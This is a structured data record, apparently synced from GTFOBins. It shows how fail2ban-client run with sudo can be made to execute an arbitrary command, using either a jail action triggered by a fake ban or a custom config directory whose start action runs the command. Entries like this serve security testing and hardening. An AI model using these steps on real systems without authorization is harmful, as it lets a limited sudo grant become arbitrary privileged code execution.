id: gtfobins/fail2ban-client/command/sudo
type: binary
platform: linux
name: fail2ban-client
phases:
- execution
- privilege-escalation
capabilities:
- command-execution
privilege_required: sudo
sources:
- project: GTFOBins
  upstream_url: https://gtfobins.github.io
  license: MIT (verify upstream LICENSE)
  upstream_version: acd5246
  last_synced: '2026-08-25'
commands:
- template: 'fail2ban-client add x

    fail2ban-client set x addaction x

    fail2ban-client set x action x actionban /path/to/command

    fail2ban-client start x

    fail2ban-client set x banip 999.999.999.999

    fail2ban-client set x unbanip 999.999.999.999

    fail2ban-client stop x'
  comment: The subprocess is immediately sent to the background, but `fail2ban-client` waits on a return
    code from the subprocess. The `banip` command will hang until the subprocess returns.
- template: 'cat >/path/to/temp-dir/fail2ban.conf <<EOF

    [Definition]

    EOF


    cat >/path/to/temp-dir/jail.local <<EOF

    [x]

    enabled = true

    action = x

    EOF


    mkdir -p /path/to/temp-dir/action.d/

    cat >/path/to/temp-dir/action.d/x.conf <<EOF

    [Definition]

    actionstart = /path/to/command

    EOF


    mkdir -p /path/to/temp-dir/filter.d/

    cat >/path/to/temp-dir/filter.d/x.conf <<EOF

    [Definition]

    EOF


    fail2ban-client -c /path/to/temp-dir/ -v restart'
references:
- https://gtfobins.github.io/gtfobins/fail2ban-client/
tags:
- linux
- unix
- gtfobins
